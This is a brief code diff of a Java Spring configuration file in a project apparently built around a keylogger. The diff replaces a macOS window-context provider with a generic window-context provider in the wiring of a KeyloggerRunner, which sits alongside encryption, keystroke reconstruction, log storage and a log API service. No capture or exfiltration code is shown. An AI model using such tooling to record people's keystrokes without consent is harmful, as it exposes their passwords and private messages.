@@ -2,7 +2,7 @@ package com.keyguard.javakeyguard.config;
 
 import com.keyguard.javakeyguard.api.LogApiService;
 import com.keyguard.javakeyguard.keylogger.KeyloggerRunner;
-import com.keyguard.javakeyguard.keylogger.context.MacContextProvider;
+import com.keyguard.javakeyguard.keylogger.context.WindowContextProvider;
 import com.keyguard.javakeyguard.keylogger.encryption.EncryptionService;
 import com.keyguard.javakeyguard.keylogger.reconstruction.ReconstructionService;
 import com.keyguard.javakeyguard.keylogger.storage.LogStorageService;
@@ -21,7 +21,7 @@ public class StartupConfig {
             EncryptionService encryptionService,
             ReconstructionService reconstructionService,
             LogStorageService logStorageService,
-            MacContextProvider contextProvider,
+            WindowContextProvider contextProvider,
             LogApiService logApiService) {
 
         return new KeyloggerRunner(
